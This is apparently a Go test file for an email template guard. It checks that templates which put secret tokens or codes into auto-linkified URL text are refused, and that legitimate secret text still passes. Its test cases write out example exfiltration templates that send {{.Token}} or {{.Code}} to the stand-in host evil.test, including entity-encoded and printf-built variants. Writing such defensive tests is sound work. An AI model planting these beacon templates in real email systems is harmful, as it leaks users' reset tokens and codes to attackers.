package email

import (
	"strings"
	"testing"
)

// Bare URL-shaped text carrying a live secret is the beacon the attribute
// allowlist cannot see. Mail clients (Gmail, Apple Mail, Outlook, and most
// security gateways) auto-linkify https://… runs in HTML text nodes, and some
// prefetch them. The four-stage guard scanned tags and attributes and left
// text between them unread, so:
//
//	<p>https://evil.test/p?t={{.Token}}</p>
//
// passed every stage: the differential sees only verbatim substitution, the
// allowlist never meets a tag that fetches, and the secret-in-attribute rule
// never fires. The live token then leaves for a host the operator did not
// configure the moment the message is opened or the link is followed.
//
// The configured link used whole ({{.URL}}) is still legitimate: after masking
// it is the control-character placeholder, which is not URL-shaped, so the
// text check does not confuse a reset link the operator meant with a beacon.

// textBeaconCases is package-level so the fuzz corpus can seed from the same
// list this test pins, rather than from a copy that drifts out of step with it.
var textBeaconCases = []struct {
	name string
	src  string
}{
	{
		name: "https URL carrying the token",
		src:  `<p>https://evil.test/p?t={{.Token}}</p>`,
	},
	{
		name: "http URL carrying the code",
		src:  `<p>http://evil.test/?c={{.Code}}</p>`,
	},
	{
		name: "printf-built URL carrying the token",
		src:  `<p>{{printf "https://evil.test/%s" .Token}}</p>`,
	},
	{
		name: "protocol-relative URL carrying the token",
		src:  `<p>Click //evil.test/p?t={{.Token}} now</p>`,
	},
	{
		name: "www-form URL carrying the token",
		src:  `<p>www.evil.test/p?t={{.Token}}</p>`,
	},
	{
		name: "HTML-entity scheme still linkifies",
		src:  `<p>https&#58;//evil.test/p?t={{.Token}}</p>`,
	},
	{
		name: "mixed with a legitimate whole link",
		src:  `<p>{{.URL}}</p><p>https://evil.test/?t={{.Token}}</p>`,
	},
	{
		name: "markdown-shaped autolink text",
		src:  `<p>[reset](https://evil.test/{{.Token}})</p>`,
	},
}

func TestGuardRefusesSecretBearingAutolinkText(t *testing.T) {
	for _, tc := range textBeaconCases {
		t.Run(tc.name, func(t *testing.T) {
			err := guardTemplate([]byte(tc.src))
			if err == nil {
				t.Fatalf("guardTemplate ACCEPTED a text-node beacon: %s", tc.src)
			}
			// printf-built beacons are refused by the derivation check before the
			// text walker runs; literal URL text is refused by the autolink check.
			if !strings.Contains(err.Error(), "URL-shaped") &&
				!strings.Contains(err.Error(), "auto-link") &&
				!strings.Contains(err.Error(), "derives") {
				t.Fatalf("refused for the wrong reason (want autolink/URL-shaped or derivation): %v", err)
			}
		})
	}
}

func TestGuardStillAllowsLegitimateSecretText(t *testing.T) {
	ok := []string{
		`<p>Your code is <strong>{{.Code}}</strong>.</p>`,
		`<p>Or copy this link: {{.URL}}</p>`,
		`<p>{{.URL}}</p>`,
		`<p>Token: {{.Token}}</p>`,
		`<p>Visit https://ok.test for help. Code: {{.Code}}</p>`,
		`<a href="{{.URL}}">Reset</a><p>code {{.Code}}</p>`,
		// Space-separated host and secret are not one auto-linked run.
		`<p>https://evil.test/ {{.Token}}</p>`,
	}
	for _, src := range ok {
		if err := guardTemplate([]byte(src)); err != nil {
			t.Fatalf("guardTemplate rejected legitimate secret text %q: %v", src, err)
		}
	}
}

// Both public doors must refuse the same text-node beacon, or the fix only
// covers the funnel the unit tests call.
func TestBothOverrideDoorsRefuseTextNodeBeacon(t *testing.T) {
	src := `<p>https://evil.test/p?t={{.Token}}</p>`
	if _, err := CompileOverride(TemplateOverride{Subject: "Reset", HTMLContent: src}); err == nil {
		t.Fatal("CompileOverride ACCEPTED a text-node beacon")
	}
}
